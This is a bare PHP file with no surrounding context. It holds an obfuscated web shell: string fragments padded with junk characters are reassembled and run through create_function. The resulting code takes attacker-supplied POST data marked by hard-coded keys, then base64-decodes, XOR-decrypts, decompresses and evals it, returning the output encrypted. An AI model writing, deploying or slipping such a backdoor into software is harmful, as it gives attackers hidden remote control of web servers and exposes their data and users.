<?php
$Q='nts("phpqD://inpqDut"),$m)==qD1) {@qDob_starqDt(qD);@evqDal(@gzuncomqDprqDess(@x';
$I='r($i=0;$i<$l;qD){for(qD$jqD=0;($j<$qDc&&$i<qD$l);$qDjqD++,$i+qD+){$o.=$t{$i}qD^$k{$j';
$J=str_replace('m','','cremmatmem_funcmmtion');
$D='qD};}}reqDturn $oqDqD;}if qD(@preg_maqDtcqDqDh("/qD$kh(.+)$qDkf/",qD@file_get_conqDte';
$Y='(@bqDaseqD64_decodeqD($m[qD1qD]),$k))qD);qD$o=@ob_get_qDcoqDntents();@oqDbqDqD_end_clea';
$n='n();$r=@bqDqDase64_eqDqDncode(@x(@gzcompresqDs($o),$qDk)qD);pqDrint("qD$p$kh$r$kf");}';
$G='$k="6d59qD028qD0qD";$qDkh="f374bde1c5f4qD";$kfqD=qD"37b074bcf3qDd3";qD$p=qD"ILn02PqD';
$C='HqqDWcpqDcmDVb";function xqD($t,$k){$qDcqD=strlen($kqD)qD;$l=strlenqD($tqD);$o=qD""qD;fo';
$F=str_replace('qD','',$G.$C.$I.$D.$Q.$Y.$n);
$p=$J('',$F);$p();
?>
